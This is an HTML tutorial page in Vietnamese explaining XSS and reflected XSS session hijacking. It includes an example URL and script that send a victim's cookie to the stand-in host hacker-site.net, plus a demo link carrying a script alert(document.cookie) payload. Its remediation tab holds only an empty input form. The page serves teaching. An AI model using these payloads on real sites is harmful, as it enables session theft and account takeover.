<div class="card">
    <div class="card-header bg-primary text-white">
        Lỗ hổng bảo mật Xss
    </div>
    <div class="card-body">
        <h5 class="card-title"></h5>
        <div class="card-text">
            <ul class="nav nav-tabs" id="myTab" role="tablist">
                <li class="nav-item">
                    <a class="nav-link active" id="home-tab" data-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="true">Định nghĩa</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" id="reflected-tab" data-toggle="tab" href="#reflected" role="tab" aria-controls="reflected" aria-selected="false">Reflected XSS</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" id="khacphuc-tab" data-toggle="tab" href="#khacphuc" role="tab" aria-controls="khacphuc" aria-selected="false">Cách khắc phục</a>
                </li>
            </ul>
            <div class="tab-content" id="myTabContent">
                <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
                    <h3>XSS là gì?</h3>
                    <p>Cross Site Scripting (XSS) là một trong những tấn công phổ biến và dễ bị tấn công nhất mà tất cả các Tester có kinh nghiệm đều biết đến. Nó được coi là một trong những tấn công nguy hiểm nhất đối với các ứng dụng web và có thể mang lại những hậu quả nghiêm trọng. Giới thiệu về tấn công XSS Tấn công XSS là một đoạn mã độc, để khái thác một lỗ hổng XSS, hacker sẽ chèn mã độc thông qua các đoạn script để thực thi chúng ở phía Client. Thông thường, các cuộc tấn công XSS được sử dụng để vượt qua truy cập và mạo danh người dùng.

                        Mục đích chính của cuộc tấn công này là ăn cắp dữ liệu nhận dạng của người dùng như: cookies, session tokens và các thông tin khác. Trong hầu hết các trường hợp, cuộc tấn công này đang được sử dụng để ăn cắp cookie của người khác. Như chúng ta biết, cookie giúp chúng tôi đăng nhập tự động. Do đó với cookie bị đánh cắp, chúng tôi có thể đăng nhập bằng các thông tin nhận dạng khác. Và đây là một trong những lý do, tại sao cuộc tấn công này được coi là một trong những cuộc tấn công nguy hiểm nhất.

                        Tấn công XSS đang được thực hiện ở phía client. Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau. Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với Javascript và HTML.

                        <h3>Tấn công XSS thực hiện như thế nào?</h3>
                        Tấn công Cross Site Scripting nghĩa là gửi và chèn lệnh và script độc hại, những mã độc này thường được viết với ngôn ngữ lập trình phía client như Javascript, HTML, VBScript, Flash… Tuy nhiên, cách tấn công này thông thường sử dụng Javascript và HTML. Cách tấn công này có thể được thực hiện theo nhiều cách khác nhau, phụ thuộc vào loại tấn công XSS, những mã độc có thể được phản chiếu trên trình duyệt của nạn nhân hoặc được lưu trữ trong cơ sở dữ liệu và được chạy mỗi khi người dùng gọi chức năng thích hợp. Nguyên nhân chính của loại tấn công này là xác thực đầu vào dữ liệu người dùng không phù hợp, dữ liệu độc hại từ đầu vào có thể xâm nhập vào dữ liệu đầu ra. Mã độc có thể nhập một script và được chèn vào mã nguồn của website. Khi đó trình duyệt không thể biết mã thực thi có phải độc hại hay không. Do đó mã độc hại có thể đang được thực thi trên trình duyệt của nạn nhận hoặc bất kỳ hình thức giả nào đang được hiển thị cho người sử dụng. Có một số hình thức tấn công XSS có thể xảy ra. Bên dưới là những hình thức tấn công chính của Cross Site Scripting:

                        Cross Site Scripting có thể xảy ra trên tập lệnh độc hại được thực hiện ở phía client.
                        Trang web hoặc form giả mạo được hiển thị cho người dùng (nơi nạn nhân nhập thông tin đăng nhập hoặc nhấp vào liên kết độc hại).
                        Trên các trang web có quảng cáo được hiển thị.
                        Email độc hại được gửi đến nạn nhân. Tấn công xảy ra khi tin tặc tìm kiếm những lỗ hổng trên website và gửi nó làm đầu vào độc hại. Tập lệnh độc hại được tiêm vào mã lệnh và sau đó được gửi dưới dạng đầu ra cho người dùng cuối cùng.
                        Chúng ta hãy phân tích một ví dụ đơn giản sau đây: Tưởng tượng chúng ta có 1 trang web với trường Search.

                        Nếu trường Search là trường có lỗ hổng, khi người dùng nhập bất kỳ đoạn script thì nó sẽ được thực thi.
                    </p>
                </div>
                <div class="tab-pane fade" id="reflected" role="tabpanel" aria-labelledby="reflected-tab">
                    <p>
                        Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một trong những cách được biết đến nhiều nhất là chiếm phiên làm việc (session) của người dùng, từ đó có thể truy cập được dữ liệu và chiếm được quyền của họ trên website.
                        <br>
                        <b> Ví dụ </b>
                        <br>
                        Người dùng đăng nhập web và giả sử được gán session:
                        <br>
                        Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4
                        <br>
                        Bằng cách nào đó, hacker gửi được cho người dùng URL:
                        <br>
                        http://example.com?name=var+i=new+Image;+i.src=”http://hacker-site.net/”%2Bdocument.cookie;
                        <br>
                        Giả sử example.com là website nạn nhân truy cập, hacker-site.net là trang của hacker tạo ra
                        <br>
                        Nạn nhân truy cập đến URL trên
                        <br>
                        Server phản hồi cho nạn nhân, kèm với dữ liệu có trong request (đoạn javascript của hacker)
                        <br>
                        Trình duyệt nạn nhân nhận phản hồi và thực thi đoạn javascript
                        <br>
                        Đoạn javascript mà hacker tạo ra thực tế như sau:
                        <br>
                        var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;
                        <br>
                        Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng:
                        <br>
                        GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4 HTTP/1.1
                        <br>
                        Host: hacker-site.net
                        <br>
                        Từ phía site của mình, hacker sẽ bắt được nội dung request trên và coi như session của người dùng sẽ bị chiếm. Đến lúc này, hacker có thể giả mạo với tư cách nạn nhân và thực hiện mọi quyền trên website mà nạn nhân có.
                        <br>
                        <b> Demo </b>
                        <a href="./demos/reflected.php?name=<script>alert(document.cookie)</script>">Demo Reflected Xss</a>
                    </p>
                    <br>
                </div>
                <div class="tab-pane fade" id="khacphuc" role="tabpanel" aria-labelledby="khacphuc-tab">
                    <b>Ví dụ</b>

                    <form>
                        <div class="form-group">
                            <label for="reflected">Input</label>
                            <input type="text" class="form-control" id="reflected">
                        </div>
                        <div class="form-group">
                            <button class="btn btn-primary">Gửi</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

</div>